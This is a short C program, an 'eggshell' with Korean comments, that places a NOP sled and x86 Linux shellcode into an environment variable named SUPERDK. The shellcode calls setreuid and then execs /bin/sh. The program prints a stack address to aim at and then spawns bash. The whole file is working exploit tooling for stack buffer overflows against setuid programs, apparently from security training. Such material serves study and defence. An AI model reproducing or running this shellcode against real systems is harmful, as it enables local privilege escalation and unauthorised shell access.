/*
 * Author : superdk@hanmail.net
 * DATA : eggshell code
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_OFFSET          0
#define DEFAULT_ADDR_SIZE		8
#define DEFAULT_BUFFER_SIZE     512
#define DEFAULT_SUPERDK_SIZE    2048
#define NOP       				0x90


// 배시셸을 실행시키는 셸코드
char shellcode[] =
	"\x66\xbb\x1c\x0c\x66\xb9\x1c\x0c\x31\xc0\xb0\x46\xcd\x80"
	"\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

// 스택포인터(SP) 를 가져오는 함수
unsigned long get_sp(void)
{
        __asm__("movl %esp, %eax");
}


int main(int argc, char **argv)
{
	char    *ptr, *superSH;
	char    shAddr[DEFAULT_ADDR_SIZE + 1];
	char    cmdBuf[DEFAULT_BUFFER_SIZE];
	long    *addr_ptr, addr;
	int     offset=DEFAULT_OFFSET;
	int     i, supershLen=DEFAULT_SUPERDK_SIZE;
	int     chgDec[3];

	// 셸코드를 올릴 포인터 주소에 동적 메모리 할당
	if ( !(superSH = malloc(supershLen)) )
	{
		printf("Can't allocate memory for supershLen");
		exit(0);
	}

	// 셸코드의 주소 읽어와서 화면에 출력
	addr = get_sp() - offset;
	printf("Using address: 0x%x\n", addr);

	// 셸코드 실행 확률을 높이기 위해서, 셸코드 앞에 충분한 NOP 추가
	ptr = superSH;
	for(i = 0; i < supershLen - strlen(shellcode) - 1; i++)
		*(ptr++) = NOP;

	// NOP 뒤에 셸코드 추가
	for(i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];

	// 배열의 끝을 명확히 알려주기 위해 문자열의 끝 표시
	superSH[supershLen - 1] = '\0';

	// SUPERDK 라는 환경변수명으로 셸코드를 환경 변수에 등록
	memcpy(superSH, "SUPERDK=", DEFAULT_ADDR_SIZE);
	putenv(superSH);

	// 새로운 배시셸 실행
	system("/bin/bash");
}
